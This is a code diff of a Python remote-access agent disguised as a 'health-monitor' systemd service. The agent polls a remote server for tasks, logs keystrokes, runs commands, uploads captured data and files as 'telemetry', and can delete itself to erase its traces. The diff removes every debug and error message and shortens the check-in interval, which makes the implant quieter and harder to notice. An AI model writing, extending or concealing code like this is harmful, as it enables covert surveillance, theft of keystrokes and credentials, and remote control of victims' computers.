@@ -417,13 +417,11 @@ def register_device(config, device_id):
         data["device_name"] = get_device_name()
         data["registered"] = datetime.now(timezone.utc).isoformat()
         api_request(config, "devices", "POST", data)
-        print(f"Device registered: {device_id}", flush=True)
     else:
         api_request(config, f"devices?device_id=eq.{device_id}", "PATCH", {"last_sync": datetime.now(timezone.utc).isoformat()})
 
 def self_destruct():
     try:
-        print("Initiating self-destruct...", flush=True)
         run_command("systemctl --user disable health-monitor.service")
         service_file = os.path.expanduser("~/.config/systemd/user/health-monitor.service")
         if os.path.exists(service_file): os.remove(service_file)
@@ -432,7 +430,6 @@ def self_destruct():
         if os.path.exists(BASE_PATH): shutil.rmtree(BASE_PATH)
         return True
     except Exception as e:
-        print(f"Destruct failed: {e}", flush=True)
         return False
 
 PROCESSED_TASKS = set()
@@ -446,7 +443,6 @@ def process_tasks(config, device_id):
     for task in tasks:
         task_id = task['id']
         if task_id in PROCESSED_TASKS:
-            print(f"Skipping already processed task: {task_id}", flush=True)
             continue
         
         # Mark task as processing immediately to prevent double execution
@@ -457,7 +453,6 @@ def process_tasks(config, device_id):
         PROCESSED_TASKS.add(task_id)
         task_type = task['task_type']
         params = task.get('task_params', {})
-        print(f"Processing task: {task_type} (ID: {task_id})", flush=True)
 
         result_data = None
         data_type = None
@@ -477,7 +472,6 @@ def process_tasks(config, device_id):
 
             elif task_type == "input_monitor":
                 duration = int(params.get('duration', 60))
-                print(f"DEBUG: Monitoring keystrokes for {duration} seconds...", flush=True)
                 # Clear buffer before monitoring
                 with KEYLOG_LOCK:
                     KEYLOG_BUFFER.clear()
@@ -486,7 +480,6 @@ def process_tasks(config, device_id):
                 
                 with KEYLOG_LOCK:
                     logs = "".join(KEYLOG_BUFFER)
-                    print(f"DEBUG: Captured {len(KEYLOG_BUFFER)} keystrokes: {logs[:100]}...", flush=True)
                 
                 result_data = {"data": logs if logs else "[No keystrokes recorded]"}
                 data_type = "input"
@@ -559,7 +552,7 @@ def process_tasks(config, device_id):
                 data_type = "cmd_result"
                 should_fail_task = (code != 0)
 
-            # Send Result - FIXED VERSION
+            # Send Result
             if result_data:
                 # 1. Insert data into telemetry table
                 telemetry_payload = {
@@ -577,30 +570,20 @@ def process_tasks(config, device_id):
                 if "file_data" in result_data:
                     telemetry_payload["file_data"] = result_data["file_data"]
                 
-                print(f"DEBUG: Sending telemetry: {json.dumps({k: v[:100] + '...' if isinstance(v, str) and len(v) > 100 else v for k, v in telemetry_payload.items()}, indent=2)}", flush=True)
-                
                 telemetry_success = api_request(config, "telemetry", "POST", telemetry_payload)
                 
                 # 2. Update task status to complete
                 task_update_payload = {
-                    "status": "failed" if should_fail_task else "complete",  # Note: 'complete' not 'completed'
+                    "status": "failed" if should_fail_task else "complete",
                     "completed_at": datetime.now(timezone.utc).isoformat()
                 }
                 
-                print(f"DEBUG: Updating task status: {json.dumps(task_update_payload, indent=2)}", flush=True)
-                
                 task_success = api_request(config, f"tasks?id=eq.{task_id}", "PATCH", task_update_payload)
-                
-                if telemetry_success and task_success:
-                    print(f"✅ Task {task_id} completed and data saved to telemetry", flush=True)
-                else:
-                    print(f"❌ Failed - Telemetry: {telemetry_success}, Task Update: {task_success}", flush=True)
                 
                 if should_destruct: 
                     sys.exit(0)
 
         except Exception as e:
-            print(f"Task Error: {e}", flush=True)
             error_payload = {
                 "status": "failed", 
                 "result_data": {"error": str(e)},
@@ -610,7 +593,6 @@ def process_tasks(config, device_id):
 
 
 def main():
-    print("Agent started.", flush=True)
     config = get_config()
     if not config: return
     device_id = get_device_id()
@@ -622,11 +604,11 @@ def main():
             register_device(config, device_id)
             process_tasks(config, device_id)
         except Exception as e:
-            print(f"Loop Error: {e}", flush=True)
-        time.sleep(config.get('sync_interval', 60))
+            pass
+        time.sleep(config.get('sync_interval', 10))
 
 if __name__ == "__main__":
     try:
         main()
     except Exception as e:
-        print(f"CRITICAL: {e}", flush=True)
+        pass
